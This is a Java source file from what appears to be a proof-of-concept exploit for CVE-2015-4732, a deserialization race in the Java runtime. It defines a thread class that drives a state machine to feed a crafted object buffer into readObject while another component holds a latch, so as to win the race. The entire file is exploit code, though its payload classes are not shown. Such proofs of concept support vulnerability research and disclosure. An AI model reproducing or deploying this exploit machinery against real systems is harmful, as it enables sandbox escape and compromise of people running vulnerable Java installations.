package poc.cve_2015_4732;

import java.io.ByteArrayInputStream;
import java.util.concurrent.atomic.AtomicInteger;

public class EXTThread extends Thread {
	
	private static final AtomicInteger THREAD_COUNT = new AtomicInteger( 0 );
	
	public final int threadID;
	
	private State threadState;
	
	private volatile OIS ois;
	
	public EXTThread( ) {
		this.threadID = EXTThread.THREAD_COUNT.incrementAndGet();
		
		this.threadState = State.STOPPED;
		
		this.setDaemon( true );
		this.start();
	}
	
	public void setOIS( OIS ois ) {
		this.ensureState( State.RESET );
		
		this.ois = ois;
		this.setState( State.OIS_READ );
	}
	
	public void ensureState( State state ) {
		synchronized( this ) {
			if( this.threadState != state ) {
				throw new AssertionError( "Expected: " + state + ", Got: " + this.threadState );
			}
		}
	}
	
	public void waitForState( State state ) {
		synchronized( this ) {
			while( this.threadState != state ) {
				try {
					this.wait();
				}
				catch ( InterruptedException e ) { }
			}
		}
	}
	
	public void setState( State state ) {
		synchronized( this ) {
			this.threadState = state;
			
			this.notifyAll( );
		}
	}
	
	public void stopThread( ) {
		State curState = null;
		synchronized( this ) {
			curState = this.threadState;
		}
		
		switch( curState ) {
			case EXT_CON_HOLD:
				Capture.CDL.countDown();
			case EXT_CON_CONT:
				this.waitForState( State.EXT_READ_HOLD );
				
			case EXT_READ_HOLD:
				this.setState( State.EXT_READ_CONT );
			case EXT_READ_CONT:
				this.waitForState( State.RESET );
				
			case RESET:
				this.setState( State.STOP );
				this.waitForState( State.STOPPED );
				
			case STOPPED:
				return;
				
				
			default:
				throw new AssertionError( "Invalid current state: " + curState );
		}
	}
	
	public void reset( ) {
		State curState = null;
		synchronized( this ) {
			curState = this.threadState;
		}
		
		switch( curState ) {
			case EXT_CON_HOLD:
				Capture.CDL.countDown();
			case EXT_CON_CONT:
				this.waitForState( State.EXT_READ_HOLD );
				
			case EXT_READ_HOLD:
				this.setState( State.EXT_READ_CONT );
			case EXT_READ_CONT:
				this.waitForState( State.RESET );
				
			case STOPPED:
			case RESET:
				return;
			default:
				break;
		}
	}
	
	@Override
	public void run( ) {
		this.setState( State.RESET );
		
		while( true ) {
			State curState = null;
			synchronized( this ) {
				curState = this.threadState;
			}
			
			switch( curState ) {
				case OIS_READ:
					try {
						ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( ByteBuffers.RACE_OBJECT ) );
						this.ois.readObject();
					}
					catch( Throwable t ) {}
					this.setState( State.RESET );
				case RESET:
					synchronized( this ) {
						try {
							this.wait();
						}
						catch ( InterruptedException e ) { }
					}
					break;
				case STOP:
					this.setState( State.STOPPED );
					return;
				default:
					throw new AssertionError( "Invalid main state: " + curState );
			}
		}
	}
	
	public static enum State {
		
		RESET,
		
		OIS_READ,
		
		EXT_CON_HOLD,
		EXT_CON_CONT,
		
		EXT_READ_HOLD,
		EXT_READ_CONT,
		
		STOP,
		STOPPED;
		
	}
	
}
